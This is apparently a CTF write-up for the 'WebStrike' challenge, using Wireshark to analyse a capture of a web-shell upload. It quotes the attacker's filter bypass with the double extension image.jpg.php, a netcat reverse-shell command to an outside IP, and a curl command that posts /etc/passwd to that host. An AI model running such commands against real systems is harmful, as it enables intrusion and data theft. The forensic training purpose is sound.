# ctf2   challenge name WebStrike 
<br> before starting with challenge we have to do something 
<br>**first** one open statistics then protocol hierarchy to see which protocols used in the packets
<br>we will see tcp - http 
![2](https://github.com/0xT7N/ctf2/assets/75274517/4a2de490-dff2-4d6e-ba6d-1849c8210d1a)
<br>**second** open statistics then conversation to see which ips connect with each other
![3](https://github.com/0xT7N/ctf2/assets/75274517/4d23699c-0ec3-43cc-a2f6-bea59c375d40)
<br> **third** open file export-objeccts-http with it we will see which file transfer through http protocol
![5](https://github.com/0xT7N/ctf2/assets/75274517/5e261d6a-21be-4495-a5c5-dac58be0e35a)
<br> we now ready for the challenge 
# Q1 Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?
<br> using ipgeoloction 
<br> ans **Tianjin**
![4](https://github.com/0xT7N/ctf2/assets/75274517/02cdf53c-73c5-4d43-948f-1f9bee77f752)
# Q2 Knowing the attacker's user-agent assists in creating robust filtering rules. What's the attacker's user agent?
<br> using follow tcp stream we will get user agent for attacker
<br> **Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0**
![6](https://github.com/0xT7N/ctf2/assets/75274517/90433587-96ed-49be-ab06-7c4c6664a480)
# Q3 We need to identify if there were potential vulnerabilities exploited. What's the name of the malicious web shell uploaded?
<br> first we will follow the http request ant we find a post request in packet number **53** and **63**
<br> in this challenge the attacker uploaded two web shell first one called **image.php** and the second called **image.jpg.php**
<br> and in packet **53** **image.php** web shell he get invalid formate so its not worked (in this cause we can be guess the web site in this location of upload it only accepte a photos with ext jpg png or something like that so the attacker change the extention with image.jpg.php then its accept in packet **63**
<br> we will notice this command in php file **nc 117.11.88.124 8080** that mean the attacke will open a connection in port **8080** using **netcat** tool (netcat tool the connection not encrypted like socat)
![14](https://github.com/0xT7N/ctf2/assets/75274517/96d35c93-7dbf-48e3-90ed-6063b6cb9d96)
![13](https://github.com/0xT7N/ctf2/assets/75274517/32b094d6-fa99-4527-8926-e831925170ea)
# Q4 Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store the uploaded files?
<br> with following http stream we will see in packet 138 we will the web shell in path **/reviews/uploads/image.jpg.php**
<br> after the attacker access this path he gain access to the machine and can write a commands on a machine victim 
![15](https://github.com/0xT7N/ctf2/assets/75274517/3e668018-fad3-4044-a099-da53c360a1ac)
 # Q5 Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?
 <br> to know which port the attacker used for web shell we can detect it form the command wrote in php file **nc 117.11.88.124 8080** so the port is **8080**
 # Q6 Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?
 <br> to know which file was the attacker trying to exfiltrate we have to go to packet **140** that includs all commands the attacker wrote in a victime machine  
 <br> we will see this command **curl -X POST -d /etc/passwd http://117.11.88.124:443/** **curl is used in command lines or scripts to transfer data**
 <br> then the file is **passwd** It contains a list of the system's accounts 
 ![11](https://github.com/0xT7N/ctf2/assets/75274517/161bf12d-dbd6-4e50-a8ca-ba1711c17c62)


